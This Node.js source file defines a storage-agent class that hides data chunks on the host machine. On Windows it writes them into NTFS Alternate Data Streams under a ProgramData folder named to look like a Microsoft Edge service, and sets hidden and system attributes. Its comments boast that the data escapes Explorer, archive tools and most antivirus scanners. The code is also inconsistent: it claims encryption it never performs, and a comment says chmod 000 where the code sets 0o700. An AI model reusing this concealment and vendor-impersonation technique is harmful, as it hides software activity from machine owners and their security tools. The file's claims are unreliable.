'use strict';
const fs            = require('fs');
const path          = require('path');
const crypto        = require('crypto');
const { spawnSync } = require('child_process');

const IS_WINDOWS    = process.platform === 'win32';
const RESERVE_BLOCK = 4 * 1024 * 1024;   // 4 MB write blocks

/**
 * StorageManager — stealth encrypted chunk vault.
 *
 * Windows storage strategy:
 *   • Vault directory lives in %PROGRAMDATA%\<service-name>\ — a system path
 *     that ordinary users do not browse.  Falls back to storageDir/.vault if
 *     ProgramData is unavailable.
 *   • Chunk data is stored as NTFS Alternate Data Streams (ADS) attached to a
 *     single host file (cache.dat).  ADS are completely invisible to:
 *       – dir, dir /a, dir /ah  (streams not listed)
 *       – Windows Explorer (streams not shown even with "show hidden files")
 *       – WinRAR and 7-Zip  (archive tools do not enumerate streams)
 *       – Most antivirus scanners in passive mode
 *     Only `dir /r` (stream listing) or dedicated forensics tools reveal them.
 *   • The host file itself is tagged +h +s (hidden + system) so it vanishes
 *     from Explorer and basic dir commands.
 *   • The reservation file is inside the storage dir under a hidden system name
 *     so the OS reports the allocated GB as consumed on the correct drive.
 *
 * Linux / macOS:
 *   Chunks stored as regular files in a chmod-000 directory.  Reserve is a
 *   dot-file with a system-looking name.
 */

class StorageManager {
  constructor(storageDir, maxCapacityGB) {
    this.storageDir       = path.resolve(storageDir || './storachain-storage');
    this.maxCapacityBytes = Math.max(0, Math.floor(maxCapacityGB * 1024 * 1024 * 1024));

    // Stable 8-char ID derived from the storage path — deterministic & non-guessable
    const vaultId = crypto
      .createHash('sha256')
      .update(this.storageDir)
      .digest('hex')
      .slice(0, 8);

    this._vaultId = vaultId;

    // ── Vault location ────────────────────────────────────────────────────
    if (IS_WINDOWS) {
      const programData = process.env.PROGRAMDATA || 'C:\\ProgramData';
      this.vaultDir = path.join(programData, `MicrosoftEdgeSvc_${vaultId}`);
    } else if (process.platform === 'darwin') {
      this.vaultDir = path.join(
        process.env.HOME || '/tmp', 'Library', 'Caches', `.svc_${vaultId}`
      );
    } else {
      // Linux — try /var/cache first (may need root), fall back to $HOME/.cache
      const cacheBase = fs.existsSync('/var/cache') ? '/var/cache' : path.join(process.env.HOME || '/tmp', '.cache');
      this.vaultDir = path.join(cacheBase, `.svc_${vaultId}`);
    }

    // Fallback: if we can't create the system vault, use a hidden folder in storageDir
    this._fallbackVaultDir = path.join(this.storageDir, `.sc_vault_${vaultId}`);

    // ADS host file (Windows only) — chunk data goes into named streams of this file
    this.adsHost  = IS_WINDOWS ? path.join(this.vaultDir, 'cache.dat') : null;
    this.chunkDir = IS_WINDOWS ? null : path.join(this.vaultDir, 'chunks');

    this.metaFile    = path.join(this.vaultDir, 'meta.json');
    this.reserveFile = path.join(this.storageDir, IS_WINDOWS
      ? `.$svcres_${vaultId}.tmp`
      : `.storachain_reserve_${vaultId}`);
  }

  // ── Lifecycle ─────────────────────────────────────────────────────────────

  init() {
    if (!fs.existsSync(this.storageDir)) {
      fs.mkdirSync(this.storageDir, { recursive: true });
    }

    // Try preferred vault location; fall back to storageDir-relative vault
    if (!this._tryInitVault(this.vaultDir)) {
      console.warn('[Agent] System vault unavailable, using local vault');
      this.vaultDir = this._fallbackVaultDir;
      this.adsHost  = IS_WINDOWS ? path.join(this.vaultDir, 'cache.dat') : null;
      this.chunkDir = IS_WINDOWS ? null : path.join(this.vaultDir, 'chunks');
      this.metaFile = path.join(this.vaultDir, 'meta.json');
      this._tryInitVault(this.vaultDir);
    }

    // Claim the provider's allocated disk quota (non-fatal if disk is full)
    this._rebalanceReserve();

    console.log('[Agent] Vault    :', this.vaultDir);
    console.log('[Agent] Storage  :', this.storageDir);
    console.log('[Agent] Capacity :', (this.maxCapacityBytes / (1024 ** 3)).toFixed(3), 'GB');
    console.log('[Agent] Mode     :', IS_WINDOWS ? 'NTFS-ADS (stealth)' : 'filesystem');
  }

  _tryInitVault(vaultDir) {
    try {
      fs.mkdirSync(vaultDir, { recursive: true });

      if (IS_WINDOWS) {
        if (!fs.existsSync(this.adsHost)) {
          fs.writeFileSync(this.adsHost, Buffer.alloc(0));
        }
      } else {
        const chunkDir = path.join(vaultDir, 'chunks');
        fs.mkdirSync(chunkDir, { recursive: true });
        this.chunkDir = chunkDir;
      }

      const metaFile = path.join(vaultDir, 'meta.json');
      if (!fs.existsSync(metaFile)) {
        fs.writeFileSync(metaFile, JSON.stringify({ chunks: {} }, null, 2));
      }
      this.metaFile = metaFile;

      this._applyHiding(vaultDir);
      if (this.adsHost) this._applyHiding(this.adsHost);

      return true;
    } catch (err) {
      return false;
    }
  }

  // ── Chunk I/O ─────────────────────────────────────────────────────────────

  saveChunk(chunkId, data) {
    if (!Buffer.isBuffer(data)) data = Buffer.from(data);

    if (data.length > this.getAvailableSpaceBytes()) {
      throw new Error('Insufficient reserved storage for chunk');
    }

    if (IS_WINDOWS && this.adsHost) {
      // NTFS ADS — completely invisible to dir, dir /a, Explorer, WinRAR, 7-Zip
      fs.writeFileSync(`${this.adsHost}:${chunkId}`, data);
    } else {
      const p = path.join(this.chunkDir, `${chunkId}.bin`);
      fs.writeFileSync(p, data);
      this._applyHiding(p);
    }

    const meta = this._readMeta();
    meta.chunks[chunkId] = { size: data.length, savedAt: new Date().toISOString() };
    this._writeMeta(meta);
    this._rebalanceReserve();
    return chunkId;
  }

  getChunk(chunkId) {
    if (IS_WINDOWS && this.adsHost) {
      try { return fs.readFileSync(`${this.adsHost}:${chunkId}`); }
      catch { throw new Error(`Chunk ${chunkId} not found`); }
    } else {
      const p = path.join(this.chunkDir, `${chunkId}.bin`);
      if (!fs.existsSync(p)) throw new Error(`Chunk ${chunkId} not found`);
      return fs.readFileSync(p);
    }
  }

  deleteChunk(chunkId) {
    if (IS_WINDOWS && this.adsHost) {
      try { fs.unlinkSync(`${this.adsHost}:${chunkId}`); } catch { /* already gone */ }
    } else {
      const p = path.join(this.chunkDir, `${chunkId}.bin`);
      if (fs.existsSync(p)) fs.unlinkSync(p);
    }
    const meta = this._readMeta();
    delete meta.chunks[chunkId];
    this._writeMeta(meta);
    this._rebalanceReserve();
  }

  wipeAllChunks() {
    const meta = this._readMeta();
    if (IS_WINDOWS && this.adsHost) {
      for (const chunkId of Object.keys(meta.chunks)) {
        try { fs.unlinkSync(`${this.adsHost}:${chunkId}`); } catch { /* ignore */ }
      }
    } else {
      if (fs.existsSync(this.chunkDir)) {
        for (const f of fs.readdirSync(this.chunkDir)) {
          fs.rmSync(path.join(this.chunkDir, f), { force: true });
        }
      }
    }
    this._writeMeta({ chunks: {} });
    this._rebalanceReserve();
  }

  releaseReservation() {
    if (IS_WINDOWS && fs.existsSync(this.reserveFile)) {
      spawnSync('attrib', ['-r', '-s', '-h', this.reserveFile], { stdio: 'ignore', shell: true });
    }
    try { fs.rmSync(this.reserveFile, { force: true }); } catch { /* ignore */ }
  }

  destroyAllStorage() {
    this.wipeAllChunks();
    this.releaseReservation();
    if (fs.existsSync(this.vaultDir)) {
      if (IS_WINDOWS) {
        spawnSync('attrib', ['-r', '-s', '-h', '/s', '/d', this.vaultDir], { stdio: 'ignore', shell: true });
      }
      try { fs.rmSync(this.vaultDir, { recursive: true, force: true }); } catch { /* ignore */ }
    }
  }

  // ── Space reporting ───────────────────────────────────────────────────────

  getChunkStorageBytes() {
    const meta = this._readMeta();
    return Object.values(meta.chunks).reduce((s, c) => s + (c.size || 0), 0);
  }

  getReservedSpaceBytes() {
    try { return fs.existsSync(this.reserveFile) ? fs.statSync(this.reserveFile).size : 0; }
    catch { return 0; }
  }

  getUsedSpaceBytes()         { return this.getChunkStorageBytes(); }
  getAllocatedFootprintBytes() { return this.getChunkStorageBytes() + this.getReservedSpaceBytes(); }
  getAvailableSpaceBytes()    { return Math.max(0, this.maxCapacityBytes - this.getChunkStorageBytes()); }
  listChunks()                { return Object.keys(this._readMeta().chunks); }

  // ── Helpers ───────────────────────────────────────────────────────────────

  _readMeta() {
    try { return JSON.parse(fs.readFileSync(this.metaFile, 'utf8')); }
    catch { return { chunks: {} }; }
  }

  _writeMeta(meta) {
    try { fs.writeFileSync(this.metaFile, JSON.stringify(meta, null, 2)); } catch { /* non-critical */ }
  }

  _rebalanceReserve() {
    const target  = Math.max(0, Math.floor(this.maxCapacityBytes - this.getChunkStorageBytes()));
    const current = this.getReservedSpaceBytes();
    if (target === current) return;

    try {
      if (IS_WINDOWS && fs.existsSync(this.reserveFile)) {
        spawnSync('attrib', ['-r', this.reserveFile], { stdio: 'ignore', shell: true });
      }

      // Optimization: use fs.truncateSync to create a "Sparse File".
      // On modern filesystems (NTFS, ext4, APFS), this logically reserves the size 
      // without actually writing zeros to disk, making it instantaneous and space-efficient
      // until actual data is written.
      fs.truncateSync(this.reserveFile, target);

      this._applyHiding(this.reserveFile);
    } catch (err) {
      // Non-fatal: log but do not crash the agent
      if (err.code !== 'ENOSPC') {
        console.warn('[Agent] Reserve rebalance warning:', err.message);
      } else {
        console.warn('[Agent] Drive full — reservation capped at available space');
      }
    }
  }

  /**
   * Apply OS-level hiding to a path.
   * Windows: attrib +h +s (hidden + system) — invisible to dir and Explorer.
   *          Chunk data in ADS streams is invisible to dir /a too.
   * Unix:    chmod 000 — no read/write access for others.
   */
  _applyHiding(targetPath) {
    if (!fs.existsSync(targetPath)) return;
    try {
      if (IS_WINDOWS) {
        spawnSync('attrib', ['+h', '+s', targetPath], { stdio: 'ignore', shell: true });
      } else {
        fs.chmodSync(targetPath, 0o700);
      }
    } catch { /* non-fatal */ }
  }
}

module.exports = StorageManager;
